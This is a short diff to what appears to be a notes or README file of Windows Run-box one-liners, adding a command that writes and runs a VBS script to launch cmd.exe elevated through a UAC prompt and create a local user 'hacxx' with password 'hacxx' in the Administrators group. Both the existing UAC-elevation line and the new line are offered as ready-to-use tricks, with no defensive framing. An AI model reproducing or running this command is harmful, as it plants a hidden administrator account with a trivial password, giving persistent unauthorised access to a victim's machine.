@@ -26,3 +26,8 @@ New code added, elevate any exe with UAC (User Account Control)...
 UAC Elevation - Elevate any exe (Win+R)
 cmd.exe /c echo Set UAC = CreateObject("Shell.Application") >1b.vbs && echo UAC.ShellExecute "cmd.exe", , , "runas", 1 >>1b.vbs && 1b.vbs
 ---------------------------------------------------------------------------------------
+New code added, add an admin user from execute (Win+R)
+
+Add an admin user with just one line of code
+cmd.exe /c echo Set UAC = CreateObject("Shell.Application") >1b.vbs && echo UAC.ShellExecute "cmd.exe", "/c net user /add hacxx hacxx && net localgroup administrators hacxx /add", , "runas", 1 >>1b.vbs && 1b.vbs
+---------------------------------------------------------------------------------------
